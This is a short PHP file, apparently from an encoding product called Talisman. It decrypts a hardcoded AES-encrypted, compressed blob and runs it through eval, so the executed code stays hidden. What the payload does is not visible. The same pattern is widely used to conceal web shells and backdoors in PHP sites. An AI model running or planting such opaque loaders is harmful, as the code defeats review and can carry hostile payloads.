<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kc89f8 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$pd6981 = base64_decode('BJsC3yI3OiH8CxThAj7Zj0JKWTlJYVkrdFJMdUdsRjRITVgwNVRnMTNjU214UjdadG5BOU9FbzBVenVRSm5JaTFraVVtUGZ0SC9pOXExUWNHTldOSWl1TkZRTG9YTHA5OXFka3daemROQ21BTUVpWEtiWDQvWDZsRjBRdVB4L0lKTGgrU1dmckN3NWdDazdvcDdJaVd5aEFLT2swZi9YbURZNEFqN3BwR2RHK2FYb3pzQmY1ditibmpqdUgvTUN2b1phS05GL0x2cUZpc1A1ZGRYYmxYTzM5ZFR5RVBySk9nQUNVdkszWU1KdDNScFNFSmhTNDRpSEduMjQ9');
$ib9d56 = openssl_cipher_iv_length('aes-256-cbc');
$v3a40b = substr($pd6981, 0, $ib9d56);
$c31d43 = substr($pd6981, $ib9d56);
eval('?>'.gzinflate(openssl_decrypt($c31d43, 'aes-256-cbc', $kc89f8, 0, $v3a40b)));